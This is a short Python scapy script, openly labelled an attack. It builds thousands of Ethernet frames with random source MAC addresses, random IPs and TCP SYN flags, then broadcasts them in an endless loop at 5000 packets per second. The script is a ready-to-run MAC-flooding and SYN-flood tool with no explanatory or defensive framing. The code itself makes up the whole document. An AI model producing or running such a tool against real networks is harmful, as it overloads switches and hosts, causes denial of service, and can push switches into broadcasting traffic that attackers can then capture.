nbpkts = 8192
iface = "eth0"

import sys
from scapy.all import sendpfast, Ether, IP, RandIP, RandMAC, TCP

print("Initializing...")

pkts = []
for i in xrange(0, nbpkts):
  macaddr = str(RandMAC())
  pkts.append(Ether(src=macaddr, dst="ff:ff:ff:ff:ff:ff")/
              IP(src=str(RandIP()), dst=str(RandIP()))/
              TCP(dport=80, flags="S", options=[('Timestamp', (0, 0))]))

print("Launching attack, press Ctrl+C to stop...")

# ...and then we send them in loop.
while True:
  sendpfast(pkts, iface=iface, file_cache=True, pps=5000, loop=999)
